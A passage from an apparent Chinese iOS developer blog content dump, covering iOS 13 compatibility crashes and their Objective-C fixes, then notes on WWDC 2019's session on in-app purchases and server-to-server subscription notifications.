color](https://user-gold-cdn.xitu.io/2019/10/9/16daf8347a6c5949?w=300&h=55&f=png&s=5354)\n\n如果想要和以前一样未选中时也是红色，也很简单，把红点添加到 `UITabBarButton` 上，位置再根据 `UITabBarSwappableImageView` 调整即可。\n\n### 6\\. UINavigationBar 设置按钮边距导致崩溃\n从 iOS 11 开始，`UINavigationBar` 使用了自动布局，左右两边的按钮到屏幕之间会有 16 或 20 的边距。\n\n![distance](https://user-gold-cdn.xitu.io/2019/10/10/16db3abfd5976756?w=300&h=153&f=png&s=9504)\n为了避免点击到间距的空白处没有响应，通常做法是：定义一个 `UINavigationBar` 子类，重写 `layoutSubviews` 方法，在此方法里遍历 subviews 获取 `_UINavigationBarContentView`，并将其 `layoutMargins` 设置为 `UIEdgeInsetsZero`。\n```\n- (void)layoutSubviews {\n    [super layoutSubviews];\n    \n    for (UIView *subview in self.subviews) {\n        if ([NSStringFromClass([subview class]) containsString:@\"_UINavigationBarContentView\"]) {\n            subview.layoutMargins = UIEdgeInsetsZero;\n            break;\n        }\n    }\n}\n```\n然而，这种做法在 iOS 13 中会导致崩溃，崩溃信息如下：\n```\n*** Terminating app due to uncaught exception 'NSInternalInconsistencyException', reason: 'Client error attempting to change layout margins of a private view'\n```\n#### 解决方案\n使用设置 frame 的方式，让 `_UINavigationBarContentView` 向两边伸展，从而抵消两边的边距。\n```\n- (void)layoutSubviews {\n    [super layoutSubviews];\n    \n    for (UIView *subview in self.subviews) {\n        if ([NSStringFromClass([subview class]) containsString:@\"_UINavigationBarContentView\"]) {\n            if ([UIDevice currentDevice].systemVersion.floatValue >= 13.0) {\n                UIEdgeInsets margins = subview.layoutMargins;\n                subview.frame = CGRectMake(-margins.left, -margins.top, margins.left + margins.right + subview.frame.size.width, margins.top + margins.bottom + subview.frame.size.height);\n            } else {\n                subview.layoutMargins = UIEdgeInsetsZero;\n            }\n            break;\n        }\n    }\n}\n```\n\n### 7\\. 子线程修改界面导致崩溃（相册首次授权回调必现）\n在使用相册时我们会调用 `[PHPhotoLibrary requestAuthorization:]` 方法获取权限，获取的结果会通过一个带有 `PHAuthorizationStatus` 信息的 block 进行回调。\n\n```\n[PHPhotoLibrary requestAuthorization:^(PHAuthorizationStatus status) {\n    // 根据 status 判断不同状态\n}];\n```\n\n根据 [@路随心生](https://juejin.im/user/5c7c90c66fb9a049d132dcb9) 的反馈，在 iOS 13 中，如果在第一次获取权限的回调中直接修改界面，会导致崩溃，崩溃信息如下：\n\n```\nThis application is modifying the autolayout engine from a background thread after the engine was accessed from the main thread. This can lead to engine corruption and weird crashes.\n\n*** Terminating app due to uncaught exception 'NSInternalInconsistencyException', reason: 'Modifications to the layout engine must not be performed from a background thread after it has been accessed from the main thread.'\n```\n\n实际测试，第一次授权崩溃必先，再次授权偶现。另外，正如崩溃信息所言，不只是相册授权回调线程，其他子线程修改界面都有一定概率导致崩溃，而在 iOS 13 中貌似概率更高。\n\n#### 解决方案\n在 Xcode 中调试运行时，子线程修改界面会有紫色感叹号标出，注意修改成回到主线程即可。\n\n### 8\\. 默认弹出样式打开的页面在 WKWebView 中获取照片崩溃\n由于 iOS 13 中[模态视图的默认样式发生改变](#present)，如果以默认的 `UIModalPresentationPageSheet` 样式弹出一个 ViewController，并使用 `WKWebView` 通过 HTML 获取系统照片：\n```\n[_webView loadHTMLString:@\"<input accept='image/*' type='file'>\" baseURL:nil];\n```\n在点击选择按钮时，根据[@伤心的Easyman](https://juejin.im/user/5a0a45fe51882578da0d605f)的反馈，会出现崩溃，崩溃信息如下：\n```\n*** Terminating app due to uncaught exception 'NSGenericException', reason: 'Your application has presented a UIDocumentMenuViewController (<UIDocumentMenuViewController: 0x101226860>). In its current trait environment, the modalPresentationStyle of a UIDocumentMenuViewController with this style is UIModalPresentationPopover. You must provide location information for this popover through the view controller's popoverPresentationController. You must provide either a sourceView and sourceRect or a barButtonItem.  If this information is not known when you present the view controller, you may provide it in the UIPopoverPresentationControllerDelegate method -prepareForPopoverPresentation.'\n```\n具体原因是，点击获取系统照片时，会弹出一个模态视图的样式为 `UIModalPresentationPopover` 的 `UIDocumentMenuViewController`，这种样式下，如果其父 `UIViewController` 以非全屏方式 present 的，那么就需要像 iPad 一样指定其 `sourceView` 和 `sourceRect`，或者指定一个 `barButtonItem`，否则会出现上述崩溃。而使用 `UIModalPresentationFullScreen` 的方式弹出的话就不会有这个问题。\n\n#### 解决方案\n第一种方法就是指定`sourceView`、`sourceRect`，`barButtonItem` 同理：\n```\n- (void)presentViewController:(UIViewController *)viewControllerToPresent animated:(BOOL)flag completion:(void (^)(void))completion {\n    [self setUIDocumentMenuViewControllerSoureViewsIfNeeded:viewControllerToPresent];\n    [super presentViewController:viewControllerToPresent animated:flag completion:completion];\n}\n\n- (void)setUIDocumentMenuViewControllerSoureViewsIfNeeded:(UIViewController *)viewControllerToPresent{\n    if (@available(iOS 13, *)) {\n        if([UIDevice currentDevice].userInterfaceIdiom == UIUserInterfaceIdiomPhone && [viewControllerToPresent isKindOfClass:UIDocumentMenuViewController.class]){\n            viewControllerToPresent.popoverPresentationController.sourceView = self.webView;\n            viewControllerToPresent.popoverPresentationController.sourceRect = CGRectMake(15, 5, 1, 1); // 具体看按钮的位置\n        }\n    }\n}\n\n// 如果顶层有 UINavigationController 的话，需要如下指定\n- (void)presentViewController:(UIViewController *)viewControllerToPresent animated:(BOOL)flag completion:(void (^)(void))completion {\n    if([self.viewControllers.lastObject isKindOfClass:WKWebViewController.class]){\n        WKWebViewController *vc = self.viewControllers.lastObject;\n        [vc setUIDocumentMenuViewControllerSoureViewsIfNeeded:viewControllerToPresent];\n    }\n    [super presentViewController:viewControllerToPresent animated:flag completion:completion];\n}\n```\n第二种方法就是使用全屏的方式弹出（实践证明默认弹出样式在横屏下是全屏的不会崩）\n```\n- (UIModalPresentationStyle)modalPresentationStyle {\n    return UIModalPresentationFullScreen;\n}\n```\n\n### 9\\. WKWebView 在 iPad 上默认显示桌面版的网页\n在 iPadOS 上，使用 `WKWebView` 打开网页默认使用桌面版的网页，抓包发现其默认的 UserAgent 变成了 Desktop 版本:\n```\nMozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko)\n```\n原因是苹果在 iOS 13.0 中为 `WKWebView` 添加了切换桌面版本和手机版本的方法，其通过在一个新加的枚举值控制:\n```\ntypedef NS_ENUM(NSInteger, WKContentMode) {\n    WKContentModeRecommended,\n    WKContentModeMobile,\n    WKContentModeDesktop\n} API_AVAILABLE(ios(13.0));\n```\n此枚举默认值为 `WKContentModeRecommended`，在 iPhone 和 iPad mini 上映射为 `WKContentModeMobile`，在其他 iPad 上则为 `WKContentModeDesktop`，因此 iPad 上打开网页默认显示桌面版本。\n#### 解决方案\n1. 可通过 `WKWebViewConfiguration` 的新属性 [defaultWebpagePreferences](https://developer.apple.com/documentation/webkit/wkwebviewconfiguration/3194420-defaultwebpagepreferences?language=objc) 来设置，目前其仅包含一个 `WKContentMode` 类型的属性 [preferredContentMode](https://developer.apple.com/documentation/webkit/wkwebpagepreferences/3194426-preferredcontentmode?language=objc)，默认值为 `WKContentModeRecommended` 可以通过改变其值来修改显示的版本:\n```\nWKWebViewConfiguration *configuration = [[WKWebViewConfiguration alloc] init];\nif (@available(iOS 13.0, *)) {\n    configuration.defaultWebpagePreferences.preferredContentMode = WKContentModeMobile;\n}\n```\n2. 除了在初始化时候设置外，还可以通过新的代理方法实现桌面版和移动版切换，苹果给出了一个具体的例子: [Viewing Desktop or Mobile Web Content Using a Web View](https://developer.apple.com/documentation/webkit/viewing_desktop_or_mobile_web_content_using_a_web_view)，其中关键的方法为：\n```\n- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction preferences:(WKWebpagePreferences *)preferences decisionHandler:(void (^)(WKNavigationActionPolicy, WKWebpagePreferences * _Nonnull))decisionHandler {\n    preferences.preferredContentMode = WKContentModeMobile;\n    decisionHandler(WKNavigationActionPolicyAllow, preferences);\n}\n```\n\n## 方法弃用\n### 1\\. UIWebView 将被禁止提交审核\n在 iOS 13 推出后，苹果在 [UIWebView](https://developer.apple.com/documentation/uikit/uiwebview?language=objc) 的说明上将其支持的系统范围定格在了 iOS 2 ~ iOS 12。在 2019 年 12 月 23 日更新的 [News and Updates](https://developer.apple.com/news/?id=12232019b)中，苹果给出了确切的时间节点：\n> The App Store will no longer accept new apps using UIWebView as of April 2020 and app updates using UIWebView as of December 2020.\n\n2020 年 4 月开始不再接受包含 UIWebView 的**新应用**提交，2020 年 12 月开始不再接受包含 UIWebView 的**应用更新**提交。\n#### 解决方案\n用 `WKWebView` 替代 `UIWebView`，确保所有 `UIWebView` 的 api 都要移除，如果需要适配 iOS 7 的可以通过 `openURL` 的方式在 `Safari` 打开。\n\n### 2\\. 使用 UISearchDisplayController 导致崩溃\n在 iOS 8 之前，我们在 `UITableView` 上添加搜索框需要使用 `UISearchBar` + `UISearchDisplayController` 的组合方式，而在 iOS 8 之后，苹果就已经推出了 `UISearchController` 来代替这个组合方式。在 iOS 13 中，如果还继续使用 `UISearchDisplayController` 会直接导致崩溃，崩溃信息如下：\n```\n*** Terminating app due to uncaught exception 'NSGenericException', reason: 'UISearchDisplayController is no longer supported when linking against this version of iOS. Please migrate your application to UISearchController.' \n```\n#### 解决方案\n使用 `UISearchController` 替换 `UISearchBar` + `UISearchDisplayController` 的组合方案。\n\n### 3\\. MPMoviePlayerController 被弃用\n在 iOS 9 之前播放视频可以使用 `MediaPlayer.framework` 中的MPMoviePlayerController类来完成，它支持本地视频和网络视频播放。但是在 iOS 9 开始被弃用，如果在 iOS 13 中继续使用的话会直接抛出异常：\n```\n*** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: 'MPMoviePlayerController is no longer available. Use AVPlayerViewController in AVKit.'\n```\n#### 解决方案\n使用 `AVFoundation` 里的 `AVPlayer` 作为视频播放控件。\n\n## 工程适配\n### 1\\. 蓝牙权限字段更新导致崩溃以及提交审核失败\n在 iOS 13 中，苹果将原来蓝牙申请权限用的 [NSBluetoothPeripheralUsageDescription](https://developer.apple.com/documentation/bundleresources/information_property_list/nsbluetoothperipheralusagedescription?language=objc) 字段，替换为 [NSBluetoothAlwaysUsageDescription](https://developer.apple.com/documentation/bundleresources/information_property_list/nsbluetoothalwaysusagedescription?language=objc) 字段。\n> For apps with a deployment target of iOS 13 and later, use NSBluetoothAlwaysUsageDescription instead.\n\n感谢 [@dengChaoJie](https://juejin.im/user/590062eeda2f60005ddf10bd) 的反馈，如果在 iOS 13 中使用旧的权限字段获取蓝牙权限，会导致崩溃，崩溃信息如下：\n```\nThis app has crashed because it attempted to access privacy-sensitive data without a usage description.  The app's Info.plist must contain an NSBluetoothAlwaysUsageDescription key with a string value explaining to the user how the app uses this data.\n```\n另外，如果将没有新字段的包提交审核，将会收到包含 `ITMS-90683` 的邮件，并提示审核不通过。\n> Dear Developer,\n>\n> We identified one or more issues with a recent delivery for your app, \"xxx\". Please correct the following issues, then upload again.\n>\n> ITMS-90683: Missing Purpose String in Info.plist - Your app's code references one or more APIs that access sensitive user data. The app's Info.plist file should contain a NSBluetoothAlwaysUsageDescription key with a user-facing purpose string explaining clearly and completely why your app needs the data. Starting Spring 2019, all apps submitted to the App Store that access user data are required to include a purpose string. If you're using external libraries or SDKs, they may reference APIs that require a purpose string. While your app might not use these APIs, a purpose string is still required. You can contact the developer of the library or SDK and request they release a version of their code that doesn't contain the APIs. Learn more (https://developer.apple.com/documentation/uikit/core_app/protecting_the_user_s_privacy).\n>\n> Best regards,\n>\n>The App Store Team\n\n#### 解决方案\n官网文档也有说明，就是在 Info.plist 中把两个字段都加上。\n> For deployment targets earlier than iOS 13, add both NSBluetoothAlwaysUsageDescription and NSBluetoothPeripheralUsageDescription to your app’s Information Property List file. \n\n### 2\\. CNCopyCurrentNetworkInfo 使用要求更严格\n从 iOS 12 开始，`CNCopyCurrentNetworkInfo` 函数需要开启 [Access WiFi Information](https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_networking_wifi-info?language=objc) 的功能后才会返回正确的值。在 iOS 13 中，这个函数的使用要求变得更严格，根据 [CNCopyCurrentNetworkInfo](https://developer.apple.com/documentation/systemconfiguration/1614126-cncopycurrentnetworkinfo?language=occ) 文档说明，应用还需要符合下列三项条件中的至少一项才能得到正确的值：\n* 使用 [Core Location](https://developer.apple.com/documentation/corelocation?language=objc) 的应用， 并获得定位服务权限。\n* 使用 [NEHotspotConfiguration](https://developer.apple.com/documentation/networkextension/nehotspotconfiguration?language=objc) 来配置 WiFi 网络的应用。\n* 目前正处于启用状态的 VPN 应用。\n\n苹果作出这项改变主要为了保障用户的安全，因为根据 MAC 地址容易推算出用户当前所处的地理位置。同样，蓝牙设备也具有 MAC 地址，所以苹果也为蓝牙添加了新的权限，可见上一点。\n\n#### 解决方案\n根据应用需求，添加三项要求其中一项。可以选择第一项获取定位权限，因为添加的成本不会太大，只需要用户允许应用使用定位服务即可。\n\n### 3\\. LaunchImage 被弃用\niOS 8 之前我们是在`LaunchImage` 来设置启动图，每当苹果推出新的屏幕尺寸的设备，我们需要 assets 里面放入对应的尺寸的启动图，这是非常繁琐的一个步骤。因此在 iOS 8 苹果引入了 `LaunchScreen`，可以直接在 Storyboard 上设置启动界面样式，可以很方便适配各种屏幕。\n\n需要注意的是，苹果在 [Modernizing Your UI for iOS 13](https://developer.apple.com/videos/play/wwdc2019/224/)   section 中提到\n，从2020年4月开始，所有支持 iOS 13 的 App 必须提供 `LaunchScreen.storyboard`，否则将无法提交到 App Store 进行审批。\n \n![Modernizing Your UI for iOS 13](https://user-gold-cdn.xitu.io/2019/9/25/16d66db08104201c?w=300&h=219&f=png&s=22784)\n\n#### 解决方案\n使用 `LaunchScreen.storyboard` 设置启动页，弃用 `LaunchImage`。\n\n### 4\\. UISegmentedControl 默认样式改变\n默认样式变为白底黑字，如果设置修改过颜色的话，页面需要修改。\n\n![UISegmentedControl](https://user-gold-cdn.xitu.io/2019/9/25/16d66db081765de4?w=300&h=114&f=png&s=7081)\n\n原本设置选中颜色的 `tintColor` 已经失效，新增了  [selectedSegmentTintColor](https://developer.apple.com/documentation/uikit/uisegmentedcontrol/3335209-selectedsegmenttintcolor?language=objc) 属性用以修改选中的颜色。\n\n### 5\\. Xcode 11 创建的工程在低版本设备上运行黑屏\n使用 Xcode 11 创建的工程，运行设备选择 iOS 13.0 以下的设备，运行应用时会出现黑屏。这是因为 Xcode 11 默认是会创建通过 `UIScene` 管理多个 `UIWindow` 的应用，工程中除了 `AppDelegate` 外会多一个 `SceneDelegate`： \n\n![Scene Delegate](https://user-gold-cdn.xitu.io/2019/9/25/16d66db082168a94)\n\n这是为了 iPadOS 的多进程准备的，也就是说 `UIWindow` 不再是 `UIApplication` 中管理，但是旧版本根本没有 `UIScene`。\n\n#### 解决方案\n在 `AppDelegate` 的头文件加上：\n```\n@property (strong, nonatomic) UIWindow *window;\n```\n### 6\\. Xcode 11.2 编译的工程在 iOS 13.2 之前版本的设备上会出现崩溃。\n如果工程的 `storyboard` 中包含 `UITextView`，并使用 Xcode 11.2 编译打包，那么 App 在 `iOS 13.2` 之前版本的设备会出现崩溃，崩溃信息如下：\n```\n*** Terminating app due to uncaught exception 'NSInvalidUnarchiveOperationException', reason: 'Could not instantiate class named _UITextLayoutView because no class named _UITextLayoutView was found; the class needs to be defined in source code or linked in from a library (ensure the class is part of the correct target)'\n```\n这个问题是 Xcode 的锅，苹果在此后紧急发布 Xcode 11.2.1 版本进行修复，Xcode 11.2 在 2019 年 11 月 5 日被正式弃用。目前如果仍然使用 Xcode 11.2 打包提审，会收到包含 `ERROR` `ITMS-90534` 和 `WARNING` `ITMS-90703` 的拒绝信息，相同案例可见 [stackoverflow](https://stackoverflow.com/questions/58748560/app-store-app-uploading-failed-with-error-itms-90534-and-warning-itms-90703)。\n#### 解决方案\n更新至 Xcode 11.2.1 版本打包提审。\n\n## SDK 适配\n### 1\\.  使用 `@available` 导致旧版本 Xcode 编译出错\n在 Xcode 11 的 SDK 工程的代码里面使用了 `@available` 判断当前系统版本，打出来的包放在 Xcode 10 中编译，会出现一下错误：\n```\nUndefine symbols for architecture i386:\n    \"__isPlatformVersionAtLeast\", referenced from:\n        ...\nld: symbol(s) not found for architecture i386\n```\n从错误信息来看，是 `__isPlatformVersionAtLeast` 方法没有具体的实现，但是工程里根本没有这个方法。实际测试无论在哪里使用`@available` ，并使用 Xcode 11 打包成动态库或静态库，把打包的库添加到 Xcode 10 中编译都会出现这个错误，因此可以判断是 iOS 13 的 `@available` 的实现中使用了新的 api。\n\n#### 解决方案\n如果你的 SDK 需要适配旧版本的 Xcode，那么需要避开此方法，通过获取系统版本来进行判断：\n```\nif ([UIDevice currentDevice].systemVersion.floatValue >= 13.0) {\n    ...\n}\n```\n另外，在 Xcode 10 上打开 SDK 工程也应该可以正常编译，这就需要加上编译宏进行处理：\n```\n#ifndef __IPHONE_13_0\n#define __IPHONE_13_0 130000\n#endif\n\n#if __IPHONE_OS_VERSION_MAX_ALLOWED >= __IPHONE_13_0\n...\n#endif\n```\n\n## 参考文章\n本文结合个人遇到的问题和以下文章部分内容，对常见适配问题进行总结\n* [iOS 13 适配](https://www.jianshu.com/p/a0cc0f4e99c7)\n* [iOS13适配](https://www.jianshu.com/p/4654f8f6e16e)\n* [适配 iOS13](https://blog.csdn.net/weixin_34258782/article/details/93169199)\n* [Xcode11 和 iOS13 适配](http://devhy.com/33-xcode11-and-ios13/)\n* [iOS13 UI & 功能适配](https://tomee.shop/ios13-adaptation/)\n* [解决Xcode11-beta版本新创建iOS工程低版本黑屏的问题](https://blog.csdn.net/qq_18683985/article/details/97374288)\n* [Modernizing Your UI for iOS13](https://xiaozhuanlan.com/topic/5671830492)\n* [CNCopyCurrentNetworkInfo 在 iOS 13 中的新特性以及 App 无法获取 Wi-Fi 信息的解决办法](https://blog.cyaron.xyz/2019/08/01/cncopycurrentnetworkinfo-on-ios-13/)\n* [iOS13适配](http://erichuang.top/2019/08/05/Objective-C/2019/iOS13%E9%80%82%E9%85%8D/)","tags":["Technology"]},{"title":"WWDC 2019 Session 302 -- In-App Purchases and Using Server-to-Server Notifications","url":"/2019/07/25/WWDC 2019 Session 302- In-App Purchases and Using Server-to-Server Notifications/","content":"\n## Overview\n\n本章节包括以下内容：\n\n*   使用新属性 `SKStorefront` 来为不同地区的用户提供对应的商品\n*   应用收据中将添加应用预购的信息（watchOS 6.0 也将支持预购）\n*   使用服务端对服务端的通知来管理用户订阅状态\n*   订阅生命周期的讲解\n*   订阅服务新特性：账单缓冲期\n\n其中，最重要的就是服务端对服务端通知的新类型，其他特性业界基本都有手动实现的方案，现在只不过更方便成本更低。而服务端对服务端通知新类型的添加，则对用户订阅状态的管理方案带来了实质性进步，因此苹果也为此处分配了很长的篇幅。其次是账单缓冲期，可以为我们带来额外的收益。\n\n## What's new in StoreKit\n\n### Subscription Offers（订阅优惠）\n\n从 iOS 12.2、tvOS 12.2、macOS 10.14.4 开始，为了帮助应用保持订阅数量，挽回订阅流失，苹果为应用内订阅服务提供了订阅优惠的支持，包括一定时长的免费试用、一定时长的低价订阅等十种类型的优惠方案。开发者可以在 iTunes Connect 里为订阅类型的商品设置促销，促销对新用户和曾经订阅过的老用户有效。苹果会自动判断当前用户是否符合优惠条件，从而在调起系统的内购面板时，自动展示促销文案或者正常价格。\n\n### SKStorefront\n\n[SKStorefront](https://developer.apple.com/documentation/storekit/skstorefront?language=objc) 用于描述当前用户 App Store 的店面信息，目前它只有一个 `countryCode` 属性可用，这是一个三字符的国家地区编码，**表示用户的应用商店所设置的国家或者地区**。苹果为 `SKPaymentQueue` 对象添加了一个`SKStorefront`类型的属性，名为 `storefront`。 未来应该会有更多的属性被添加进来。\n\n苹果给出了示例，在进行内购商品展示前，主动获取 `SKStorefront`的`countryCode`， 然后对内购商品一一核对，确定该商品在当前国家是否要提供。这样一来，内购商品的展示逻辑就放在了客户端。很多公司出于灵活性等考虑，商品列表的数据是放在服务端的，这样可以随时配置线上的商品，而对于不同国家展示不同商品这个需求，之前也有很容易实现的方案，举个例子：服务端根据请求的 ip 判断所处地区，动态返回对应地区的商品列表。\n\n#### paymentQueueDidChangeStorefront\n\n由于在程序运行期间，`SKStorefront` 也可能发生变化（比如用户更改了自己 App Store 的设置），所以苹果在 `SKPaymentTransactionObserver` 协议添加了一个新方法：`- paymentQueueDidChangeStorefront:`，用来通知应用 `SKStorefront` 发生了变化。在此方法中，可以重新对商品的地区信息进行核对，确保显示的是正确商品。\n\n#### SKPaymentQueueDelegate\n\n如果在一次内购进行的过程中 `SKStorefront` 发生了变化，应用可能会对本次交易的内容做出调整，比如用户把 App Store 切换到另一个国家，你就不想让他买这个商品了。对此，苹果添加了一个新的协议：`SKPaymentQueueDelegate`，用于对交易过程中 storefront 信息变化时作出响应。\n\n该协议中目前只有一个方法： `- paymentQueue:shouldContinueTransaction:inStorefront:`，当内购进行期间 storefront 发生变化的时候被调用，你可以通过返回值告知系统是否希望此种情况下交易继续进行。如果你为这个方法返回了 true，用户的购买行为正常继续。如果返回了 false，那么此次购买就会终止。\n\n需要强调的一点是，出于用户体验的考虑，这个方法需要尽快返回。因此，诸如网络请求询问服务端的处理方式可能会造成延迟，苹果建议事先把验证需要的相关信息缓存在本地，然后这部分的验证可以直接在应用中进行。\n\n当你返回了false后，`- paymentQueue:updatedTransactions:` 方法被调用，你会收到一个被标记为失败的 transaction，错误码是 `storeProductNotAvailable`。这时购买行为也会被中断，你可给出一个弹窗之类的，告诉用户发生了什么。\n\n### App Pre-Orders\n\n从 iOS 11.2、tvOS 11.2、macOS 10.13.2 开始，苹果推出预购应用的服务。开启预定的应用，在上架之前就可以上线产品介绍页，用户可以提前购买或者免费获取该应用。在最新版 App Store 中，“游戏” tab 会经常出现一个 “现可预定”分类，里面就是可预定中的游戏。\n\n游戏行业有个运营的惯例是提前预约的用户在公测或正式上线后可以获得特殊奖励，提高玩家预定的积极性，从而在上线前造势。针对这类需求，苹果准备在应用的收据中添加预购相关的信息，用来判断当前用户是否预购应用，在旧版本的系统也将适用。\n\n此外，在 watchOS 6.0 的手表应用商店中，也将支持应用预约。\n\n## Server-to-Server Notifications\n\n在用户为订阅的第一个周期付款后，可能发生什么事情呢？用户可能在 App Store 中取消掉自动订阅，可能在用户支持中申请了退款，可能把自动续费的开关关了又开，诸如此类的所有事件，我们是**通通无法获知的**，因为它们都是用户和苹果的交互，并非发生在 app 内部。除非我们定时对所有的订阅用户轮询，把验证收据接口都调一遍（通过验证收据可以获知齐全的订阅状态信息），这显然是不可能的，轮询频率过高负担太重，频率过低又失去了时效性。但是，它们对于用户订阅状态的维护又必不可少，因此，全面理解服务端对服务端通知这套机制，同时正确实现处理的逻辑，对于提供了订阅服务的产品**十分重要**。\n\n### What Are Server-to-Server Notifications?\n\n以前也被称为 `statusUpdateNotifications`，简单来说，就是你需要维护一台服务器，在 iTunes Connect 上填写好这台服务器的地址，并保持其稳定可用。当用户订阅的特定事件发生时，苹果就会把事件信息通过 HTTP POST JSON 的方式主动通知这台服务器。你需要为苹果的通知返回 200 的响应作为确认回执，异常情况下苹果会重发最多三次，同时，针对这些事件进行对应的业务逻辑处理。\n\n### Setting Up Your Server\n\n苹果对接收通知的服务器有以下几点的要求：\n\n1.  请求的连接需要符合 ATS (App Transport Security)；\n2.  使用受信任证书颁发机构颁发的证书；\n3.  支持 TLS 1.2；\n4.  使用 AES-128 或 AES-256 对称加密；\n5.  使用 SHA-256 或更高级算法进行认证；\n\n### Unified Receipt\n\n在之前，获取用户订阅信息只能通过`/verifyReceipt`收据验证接口获取。在以后的通知中，苹果对通知字段的结构进行了调整，添加了新字段`.unified_receipt`，包含内购的历史记录等与收据验证接口相同的信息。需要注意的是，不同于客户端从 bundle 中取出的收据，服务端对服务端通知里带的收据并不和某次应用的安装对应，因此，你只应该在服务端存储、处理通知中的收据。此字段将包含以下几个信息：\n\n*   `lastest_receipt`：收据的唯一码，可用于收据验证接口。\n*   `lastest_receipt_info`：一个包含订阅信息和订阅者订阅情况的数组。\n*   `pending_renewal_info`：关于即将续订的信息。\n*   `status`：账单状态\n*   `environment`：账单创建的环境\n\n最多只包含最近100条记录，更多记录可以通过数据验证接口获取。\n\n### Notification Types\n\n在此之前，苹果提供了四种类型的通知：`INITIAL_BUY`、`INTERACTIVE_RENEWAL`、`DID_CHANGE_RENEWAL_PREF` 以及 `CANCEL`。它们发送的时机和字面意思一致，其中 `DID_CHANGE_RENEWAL_PREF` 是指自动续费订阅的级别发生变化（同一项订阅服务，可以分级别，例如基础版、高级版等）。**对于用户订阅状态的维护，其实这四种通知已经可以满足需求**，我们可以知晓用户初次订阅、用户更改了自动续费项目的级别、用户续费了、用户取消了订阅。  本次 WWDC 之后，苹果会再增加四种通知类型。分别是 `DID_CHANGE_RENEWAL_STATUS`、`DID_FAIL_TO_RENEW`、`DID_RECOVER`、`PRICE_INCREASE_CONSENT`，分别对应用户自动续费开关的更改、系统第一次自动续费失败、自动订阅失败过后再重试订阅成功以及用户进入了涨价流程。其中`PRICE_INCREASE_CONSENT`还包含了一个字段`price_increase_effective_date`，用于说明用户同意订阅价格变化的最后限期。\n\n### Handling Notifications\n\n这部分苹果举例了一个用户订阅的场景，过了一遍八种通知发出的时机，在此过程中详细讲解了每种通知你需要重点关注的字段，以及该如何处理。其中，`original_transaction_id`大家非常熟悉，也被演讲者频繁提到，它是一个用户订阅最初的交易 id，在每种通知中，你都可以使用这个字段去追溯这个交易。\n\n需要注意的是，如果用户升级了一个订阅项目的级别，那么会收到对旧级别的 `CANCEL` 通知，以及对新级别的 `INTERACTIVE_RENEWAL` 通知。如果是自然流失之后再次订阅，则只会收到 `INTERACTIVE_RENEWAL` 通知。未来 `DID_RECOVER` 会替代`RENEWAL` 通知，但目前它们会同时收到，这是为了给你的服务一定的调整适应时间。\n\n### 利用新通知提升用户体验\n\n用户在 App Store 对订阅项目进行的操作，以及在苹果用户支持系统中发起的退款等行为，都是用户和苹果进行的交互，我们的应用和后台服务无法及时感知，显得非常愚钝，因此这套通知系统的存在十分有必要。  总体来看，之前的四种通知，让这套通知系统达到了“可用”的水准，通过这四种通知类型，开发者可以方便地管理用户的订阅状态，然而，也仅仅是“可用”的水准。有了的新的四种通知类型，开发者可以关注到用户订阅行为更加详实的细节，对于用户的每一个操作，都能够及时感知，并且在应用内做出应对。举个例子，系统第一次自动续费失败，可能是用户无意间的操作导致付款方式失效。此刻我们的服务端收到了苹果的通知，然后下发一个提醒指令到客户端内，客户端在合适的时机用合适的方式提醒用户去检查一下付款方式，从而避免无意间的用户流失。可以看到，有了新的四种通知，我们可以把用户订阅的流程做到更好，提升了用户体验，也避免了不必要的流失。\n\n## Subscription Lifecycle\n\n在这部分，苹果用细致又不繁琐的方式完整讲述了订阅行为的生命周期。大体上的过程如下：\n\n1.  **Acquisition**，通过试用等措施来吸引用户订阅你的服务；\n2.  **Engagement**，你需要不断更新自己服务的内容让用户继续订阅你的服务；\n3.  **Retention**，保持用户订阅量，减少流失。\n\n在此生命周期中，会穿插着许多账单相关的事件，例如：从试用到购买、服务升级或降级、续订或取消订阅等，通过上述八种通知类型，我们可以检测到这些事件发生，从而做出相应操作。在此session中，演讲者对各种通知对应的事件做了详细描述以及给出示例。\n\n1.  Purchase，第一次订阅服务，应用收到此次购买的收据后，将相关信息加密传输到自己的服务器，服务器请求验证收据接口验证账单，并获取更多信息保存到数据库。服务器也会收到`INITIAL_BUY`通知，通知和账单信息的`original_transaction_id`一一对应。\n\n2.  Renewal，续订服务时，应用在下次启动时也会收到订阅收据，如果你不想等到下次启动也可以使用第一次购买的信息，然后把账单信息发送到服务器验证。这种事件服务器不会收到通知，服务器在收到应用发来的收据信息后，直接调用接口验证账单，然后提供相应服务即可。\n\n3.  Upgrade，升级订阅服务，服务会先收到一个旧服务的`CANCEL`通知，接下来会是`INTERACTIVE_RENEWAL`通知，服务器收到后可以去更新用户订阅信息，然后升级其服务。\n\n4.  Cancel，取消订阅，用户关闭自动续费的开关，在之前你可能需要对所有用户调用验证收据的接口去更新订阅信息，苹果对这种情况作出改变，新增`DID_CHANGE_RENEWAL_STATUS`通知，当用户改变续费状态时通知服务器，从而避免轮训用户的操作。\n\n5.  Churn，用户在订阅结束前，服务器没有收到任何关于他的通知，那么就可以把这名用户标记为流失用户。\n\n6.  Win Back，为了挽回流失用户，可以实行订阅优惠等措施，苹果把这单独作为一个Session，[Session 305: 订阅优惠最佳实践](https://developer.apple.com/videos/play/wwdc2019/305/)\n\n7.  Billing Error，用户本来没有想着取消订阅，但是 App Store 无法恢复或续订，可能是用户的信用卡出现异常了，这种情况下，苹果会发出一个新的通知`DID_FAIL_TO_RENEW`。当你收到这个通知时，可以停止提供服务，标记流失用户，并在应用上面提醒用户订阅已经失效。\n\n8.  Billing Retry，在上面的情况下，App Store会自动尝试续订服务，如果成功了，将会发出新的通知`DID_RECOVER`， 服务器可以更新用户订阅信息，并重新提供相应服务。\n\n## Reducing Involutary Churns（减少无意间的用户流失）\n\n这一节主要介绍苹果在帮助我们减少无意间的用户流失所做的措施和成果，包括不断优化和更新续订失败时的重试机制等，甚至使用了机器学习的模型来提升多平台恢复订阅的可能性。通过这次措施，苹果恢复了 77.4% 因为账单问题导致的订阅流失，从而将无意间的账单流失减少至 1.6%，恢复订阅数约 4600万。据数据统计，挽回的订阅数在前 16 天可达到 80%，那么我们在这期间可以做什么？那就是下一节的账单缓冲期。\n\n## Billing Grace Period（账单缓冲期）\n\n最后，介绍了一个压轴的新特性，叫做账单缓冲期（Billing Grace 